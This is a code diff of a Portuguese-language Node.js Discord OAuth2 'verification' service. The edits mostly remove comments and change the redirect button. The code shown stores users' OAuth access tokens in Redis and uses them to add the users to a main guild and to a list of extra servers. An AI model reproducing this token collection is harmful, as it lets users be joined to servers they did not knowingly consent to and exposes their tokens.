@@ -34,16 +34,12 @@ async function extrairCorDominante(imageUrl) {
       .raw()
       .toBuffer({ resolveWithObject: true });
 
-    // Conta frequência de cores agrupadas (agrupa tons similares de 32 em 32)
     const freq = {};
     for (let i = 0; i < data.length; i += 3) {
       const r = Math.round(data[i]     / 32) * 32;
       const g = Math.round(data[i + 1] / 32) * 32;
       const b = Math.round(data[i + 2] / 32) * 32;
-
-      // Ignora tons muito escuros (preto) e muito claros (branco/cinza)
       if (r + g + b < 60 || r + g + b > 680) continue;
-
       const key = `${r},${g},${b}`;
       freq[key] = (freq[key] || 0) + 1;
     }
@@ -218,13 +214,11 @@ app.post('/api/admin/bots', adminAuth, async (req, res) => {
     const raw  = await redis.get('bots_config');
     const list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
 
-    // Gera ID único
     const existingIds = list.map(b => b.id);
     let newIdx = list.length + 1;
     while (existingIds.includes(`rbot${newIdx}`)) newIdx++;
     const newId = `rbot${newIdx}`;
 
-    // ── Extrai cor dominante da imagem (se fornecida) ──────────
     let corFinal = cor || '#ff1493';
     if (imagem_url) {
       console.log(`[Bot Cadastro] Extraindo cor de: ${imagem_url}`);
@@ -265,7 +259,6 @@ app.put('/api/admin/bots/:id', adminAuth, async (req, res) => {
       if (req.body[key] !== undefined) list[idx][key] = req.body[key];
     }
 
-    // ── Se a imagem mudou, extrai a nova cor dominante ─────────
     if (req.body.imagem_url && req.body.imagem_url !== list[idx].imagem_url) {
       console.log(`[Bot Edição] Extraindo cor de: ${req.body.imagem_url}`);
       const corExtraida = await extrairCorDominante(req.body.imagem_url);
@@ -445,7 +438,6 @@ for(let i=0;i<18;i++){
 async function handleOAuth2(req, res, botCfg) {
   const code = req.query.code;
 
-  // Sem code = mostra página de verificação personalizada
   if (!code) {
     return res.send(buildVerifyPage(botCfg));
   }
@@ -472,7 +464,6 @@ async function handleOAuth2(req, res, botCfg) {
     });
     const user = await userRes.json();
 
-    // Salva token no Redis
     try { await salvarLog(user, tokenData.access_token, botCfg.id, botCfg.name); }
     catch (err) { console.log('[Aviso] Redis:', err.message); }
 
@@ -480,7 +471,6 @@ async function handleOAuth2(req, res, botCfg) {
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
       : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
-    // Envia notificação no Discord
     try {
       const contaCriada = new Date(user.id / 4194304 + 1420070400000);
       const agora       = new Date();
@@ -509,7 +499,6 @@ async function handleOAuth2(req, res, botCfg) {
       });
     } catch (err) { console.log('[Aviso] Discord notify:', err.message); }
 
-    // ── Adiciona ao servidor principal ────────────────────────
     try {
       await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}`, {
         method: 'PUT',
@@ -518,7 +507,6 @@ async function handleOAuth2(req, res, botCfg) {
       });
     } catch (err) { console.log('[Aviso] Add member:', err.message); }
 
-    // ── Atribui cargo ─────────────────────────────────────────
     if (botCfg.cargo_id) {
       try {
         await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}/roles/${botCfg.cargo_id}`, {
@@ -528,7 +516,6 @@ async function handleOAuth2(req, res, botCfg) {
       } catch (err) { console.log('[Aviso] Add role:', err.message); }
     }
 
-    // ── Servidores extras ─────────────────────────────────────
     try {
       const extrasRaw = await redis.get('servidores_extras');
       const extras    = extrasRaw ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw) : [];
@@ -544,7 +531,6 @@ async function handleOAuth2(req, res, botCfg) {
       }
     } catch (err) { console.log('[Aviso] Extras:', err.message); }
 
-    // ── Página de sucesso na cor do bot ───────────────────────
     const cor    = botCfg.cor || '#ff1493';
     const corRgb = hexToRgb(cor);
     const imgUrl = botCfg.imagem_url || 'https://i.imgur.com/G37BiaD.gif';
@@ -569,7 +555,7 @@ h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
 .name{font-size:16px;color:rgba(232,233,243,0.8);margin-bottom:20px}
 .divider{height:1px;background:rgba(${corRgb},0.15);margin:16px 0}
 .countdown{font-size:13px;color:var(--cor);font-weight:600;margin-bottom:16px}
-.btn{display:inline-flex;align-items:center;gap:8px;background:var(--cor);color:#fff;padding:12px 24px;border-radius:12px;text-decoration:none;font-size:14px;font-weight:600;box-shadow:0 4px 20px rgba(${corRgb},0.4)}
+.btn{display:inline-flex;align-items:center;gap:8px;background:var(--cor);color:#fff;padding:12px 24px;border-radius:12px;text-decoration:none;font-size:14px;font-weight:600;cursor:pointer;border:none;box-shadow:0 4px 20px rgba(${corRgb},0.4)}
 .footer{color:rgba(232,233,243,0.25);font-size:11px;margin-top:20px}
 </style></head>
 <body><div class="bg"></div>
@@ -581,7 +567,7 @@ h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
   <div class="name">Olá, ${user.username}!</div>
   <div class="divider"></div>
   <div class="countdown">Redirecionando em <span id="t">3</span>s...</div>
-  <a class="btn" href="https://discord.gg/6a4WVc8DG">
+  <button class="btn" onclick="abrirDiscord()">Abrir Discord</button>
   <div class="footer">${botCfg.name} • OAuth2</div>
 </div>
 <script>
@@ -595,8 +581,12 @@ for(let i=0;i<18;i++){
   p.style.width=p.style.height=(1+Math.random()*2)+'px';
   pts.appendChild(p);
 }
+function abrirDiscord(){
+  window.location.href='discord://discord.com/channels/1476341311035408495/1476341311425478758';
+  setTimeout(()=>{window.location.href='https://discord.gg/6a4WVc8DG';},1500);
+}
 let n=3;const el=document.getElementById('t');
-setInterval(()=>{n--;el.textContent=n;if(n<=0)window.location.href='https://discord.gg/6a4WVc8DG';},1000);
+setInterval(()=>{n--;el.textContent=n;if(n<=0)abrirDiscord();},1000);
 </script>
 </body></html>`);
 
